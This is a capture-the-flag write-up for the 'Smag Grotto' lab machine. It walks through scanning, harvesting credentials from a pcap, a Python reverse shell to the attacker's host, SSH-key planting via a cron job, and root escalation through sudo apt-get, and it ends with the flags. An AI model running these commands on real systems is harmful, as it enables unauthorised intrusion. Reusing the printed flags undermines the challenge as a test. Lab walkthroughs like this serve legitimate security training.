# Smag Grotto

Laurent Chauvin | November 17, 2022

## Resources

[1] https://www.revshells.com/

[2] https://gtfobins.github.io/gtfobins/apt-get/

## Progress

```
export IP=10.10.204.58
```

Nmap scan
```
nmap -sC -sV -oN nmap/initial $IP   

Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-17 02:34 EST
Nmap scan report for 10.10.204.58
Host is up (0.11s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 74:e0:e1:b4:05:85:6a:15:68:7e:16:da:f2:c7:6b:ee (RSA)
|   256 bd:43:62:b9:a1:86:51:36:f8:c7:df:f9:0f:63:8f:a3 (ECDSA)
|_  256 f9:e7:da:07:8f:10:af:97:0b:32:87:c9:32:d7:1b:76 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Smag
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.44 seconds
```

Gobuster scan
```
gobuster dir -u $IP -w /usr/share/wordlists/dirb/common.txt   

===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.204.58
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.0-dev
[+] Timeout:                 10s
===============================================================
2022/11/17 02:35:49 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/index.php            (Status: 200) [Size: 402]
/mail                 (Status: 301) [Size: 311] [--> http://10.10.204.58/mail/]
/server-status        (Status: 403) [Size: 277]
Progress: 4606 / 4615 (99.80%)===============================================================
2022/11/17 02:36:42 Finished
===============================================================
```

Nikto scan
```
nikto -h $IP | tee nikto.log  

- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.204.58
+ Target Hostname:    10.10.204.58
+ Target Port:        80
+ Start Time:         2022-11-17 02:35:28 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-3092: /mail/: This might be interesting...
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7890 requests: 0 error(s) and 7 item(s) reported on remote host
+ End Time:           2022-11-17 02:51:31 (GMT-5) (963 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

Checking 'robots.txt'. Nothing.

Checking source code of the page. Nothing.

Going to 'http://10.10.204.58/mail/' we can see the following

```
The following emails are being displayed using our new and improved email2web software, allowing you to view your emails in a hassle free way!

Note: all attachments must be downloaded with wget.
```

And a list of emails about 'Network Migration'.

There is a .pcap file. Let's get it.

```
wget http://10.10.204.58/aW1wb3J0YW50/dHJhY2Uy.pcap
```

and let's open it with ```wireshark```

Following the TCP Stream we see

```
POST /login.php HTTP/1.1
Host: development.smag.thm
User-Agent: curl/7.47.0
Accept: */*
Content-Length: 39
Content-Type: application/x-www-form-urlencoded

username=helpdesk&password=cH4nG3M3_n0wHTTP/1.1 200 OK
Date: Wed, 03 Jun 2020 18:04:07 GMT
Server: Apache/2.4.18 (Ubuntu)
Content-Length: 0
Content-Type: text/html; charset=UTF-8
```

It seems to have a 'login.php' page with username 'helpdesk' and password 'cH4nG3M3_n0w' to host 'development.smag.thm'. Let's add it to our host file

```
sudo nano /etc/hosts
```

and add the following entry

```
10.10.204.58    development.smag.thm
```

Then going to 'http://development.smag.thm/login.php' lead us to a login page. (It is important to add the 'http://' in front of the URL, otherwise it's doing a google search).

Using the previously found credential, we can login.

It seems we now have a webshell.

However, entering commands does not return any response. Let's try a python ```sleep``` to check if the server still execute it.

Sending command
```
python3 -c 'import time; time.sleep(5);'
```

seems to work. Let's try to get a reverse shell then.

Let's start pwncat first

```
cd /opt/pwncat
poetry shell
pwncat-cs -lp 9999
```

Then, let's generate a python3 reverse shell from Revshells [1]
```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.18.23.136",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

And.....we have shell.

We can see the user flag in 'jake' home directory but we don't have access

```
(remote) www-data@smag:/var/www/development.smag.thm$ cat /home/jake/user.txt
cat: /home/jake/user.txt: Permission denied
```

Uploaded linpeas, and running it, we see
```
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *    * * *   root    /bin/cat /opt/.backups/jake_id_rsa.pub.backup > /home/jake/.ssh/authorized_keys
```

The public ssh key of 'jake' is '/opt/.backups'. But we can edit the backup file, which would add our key into the 'authorized_keys'.

After adding my public ssh key in '/opt/.backups/jake_id_rsa.pub.backup', and waiting from the cronjob to be executed we can simply login as jake using ssh
```
ssh jake@$IP
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

Last login: Fri Jun  5 10:15:15 2020
jake@smag:~$ 
```

Let's get the flag
```
jake@smag:~$ cat user.txt 
iusGorV7EbmxM5AuIe2w499msaSuqU3j
```

Time to privesc.
```
jake@smag:~$ sudo -l
Matching Defaults entries for jake on smag:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on smag:
    (ALL : ALL) NOPASSWD: /usr/bin/apt-get
```

From GTFObins [2] we have

```
When the shell exits the update command is actually executed.

sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
```

After executing it, we have
```
# whoami
root

# cat /root/root.txt
uJr6zRgetaniyHVRqqL58uRasybBKz2T
```


## Flag

1. User

```
iusGorV7EbmxM5AuIe2w499msaSuqU3j
```

2. Privesc

```
uJr6zRgetaniyHVRqqL58uRasybBKz2T
```
